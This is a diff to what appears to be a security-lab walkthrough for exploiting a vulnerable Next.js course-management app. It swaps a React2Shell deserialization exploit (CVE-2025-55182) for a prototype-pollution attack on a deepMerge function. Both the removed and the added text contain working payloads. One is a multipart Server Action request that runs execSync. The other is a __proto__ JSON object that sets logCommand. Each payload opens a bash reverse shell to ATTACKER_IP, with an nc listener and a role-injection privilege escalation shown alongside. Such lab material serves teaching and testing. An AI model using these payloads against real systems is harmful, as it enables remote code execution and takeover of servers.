@@ -27,80 +27,43 @@ To exploit Server Actions protected by Next.js middleware, the attacker needs a 
 3. Inject `"role": "LECTURER"` into the JSON body. The backend `deepMerge` function merges this into the user record.
 4. Re-login to get a new session token with `LECTURER` privileges.
 
-## 4. Stage 2: Gathering the Action ID
+## 4. Stage 2: Exploiting Prototype Pollution to RCE
 
-React2Shell requires a valid **Next-Action ID** to instruct the server to deserialize the payload.
+The attacker intercepts the Server Action request for creating an assignment and injects a Prototype Pollution payload to pollute `logCommand` globally, achieving RCE when `child_process.exec` is called.
 
-1. As a Lecturer, navigate to `/lecturer/assignments`.
-2. Open Browser DevTools (F12) -> Elements.
-3. Look for the "Create Assignment" form.
-4. Find the hidden input field: `<input type="hidden" name="action_id" value="[ACTION_ID]">`.
-5. Note the 40-character hex string (e.g., `b6261487e7b81aaab2440e397a356732cad9e342`).
-
-## 5. Stage 3: Exploiting React2Shell (CVE-2025-55182)
-
-The attacker crafts a malicious `multipart/form-data` request that tricks the React Flight deserializer (`decodeReply`) into evaluating arbitrary JavaScript via Prototype Pollution and the Global Function Constructor.
-
-### 5.1 Prepare the C2 Listener
+### 4.1 Prepare the C2 Listener
 On the attacker machine, open a terminal:
 ```bash
 nc -lvnp 4444
 ```
 
-### 5.2 Craft the Payload in Burp Suite
-Open the Repeater tab and create a new POST request to the protected route:
+### 4.2 Craft the Payload
+1. As a Lecturer, navigate to `/lecturer/assignments`.
+2. Turn on Burp Suite Intercept.
+3. Fill out the "Create Assignment" form and click Submit.
+4. In Burp Suite, inspect the intercepted `POST` request to `/lecturer/assignments`.
+5. The request body is a JSON array (Next.js Server Action payload). Locate the assignment data object (e.g. `{"title":"Test Exploit", ...}`).
+6. Inject the `__proto__` payload into this JSON object:
 
-```http
-POST /lecturer/assignments HTTP/1.1
-Host: TARGET_IP:3000
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
-Next-Action: [INSERT_ACTION_ID_HERE]
-Cookie: authjs.session-token=[INSERT_LECTURER_TOKEN_HERE]
-Content-Length: 790
-
-------WebKitFormBoundaryx8jO2oVc6SWP3Sad
-Content-Disposition: form-data; name="0"
-
+```json
 {
-  "then": "$1:__proto__:then",
-  "status": "resolved_model",
-  "reason": -1,
-  "value": "{\"then\":\"$B1337\"}",
-  "_response": {
-    "_prefix": "var res=process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
-    "_chunks": "$Q2",
-    "_formData": {
-      "get": "$1:constructor:constructor"
-    }
+  "title": "Test Exploit",
+  "module": "General",
+  "type": "Homework",
+  "dueDate": "2026-10-10",
+  "__proto__": {
+    "logCommand": "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
   }
 }
-------WebKitFormBoundaryx8jO2oVc6SWP3Sad
-Content-Disposition: form-data; name="1"
-
-"$@0"
-------WebKitFormBoundaryx8jO2oVc6SWP3Sad
-Content-Disposition: form-data; name="2"
-
-[]
-------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
 ```
 
-### 5.3 Technical Breakdown
+### 4.3 Execution
+1. Forward the modified request in Burp Suite.
+2. The `deepMerge` function merges the payload, polluting `Object.prototype.logCommand`.
+3. The server executes `child_process.exec(logCommand)`.
+4. The reverse shell connects back to your `nc` listener!
 
-| Payload Component | Purpose |
-|-------------------|---------|
-| `Next-Action` Header | Tells Next.js to route the request to the React Flight deserializer. |
-| `name="0"` JSON | The core exploit payload. |
-| `"then": "$1:__proto__:then"` | Pollutes the prototype to make the object a "fake Promise" (Thenable). |
-| `_prefix` | Injects the shell command (`child_process.execSync`) before the response. |
-| `"get": "$1:constructor:constructor"` | Escapes the sandbox by walking up the prototype chain to access the Global `Function` constructor, which executes the `_prefix` code. |
-
-### 5.4 Execution
-1. Send the request in Burp Suite.
-2. The server processes the session cookie and allows the request past the middleware.
-3. The React Flight deserializer parses the payload, triggering the RCE **before** the actual `createAssignment` action is executed.
-4. The server returns a `500 Internal Server Error` with `NEXT_REDIRECT` and the output of your shell command in the `digest` field (if any).
-5. The reverse shell connects back to your `nc` listener!
+> **Note:** The server will likely throw an error after the command executes (e.g., a Prisma Validation Error when it tries to save the polluted metadata to the database), but the RCE will have already succeeded.
 
 ## 6. Conclusion
 This lab demonstrates that:
